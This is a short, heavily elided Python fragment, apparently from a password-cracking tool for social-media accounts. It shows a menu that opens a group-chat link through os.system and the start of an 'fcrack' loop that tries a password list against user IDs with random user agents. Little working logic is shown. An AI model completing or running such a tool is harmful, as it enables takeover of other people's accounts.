...
def fia():    
			...
			if xd in ['1','01']:
				...
				os.system(f'xdg-open https://https://chat.whatsapp.com/Er8P6NsUAaQFzMPdE518YV');menu()
			elif xd in ['0','00']:
				exit()
			else:
...
def fcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write(f'\r [\033[1;97mDADA / SARKAR\033[1;97m] %s|OK:-%s \r'%(loop,len(cps))),
			sys.stdout.flush()
			ua = random.choice(ugen)
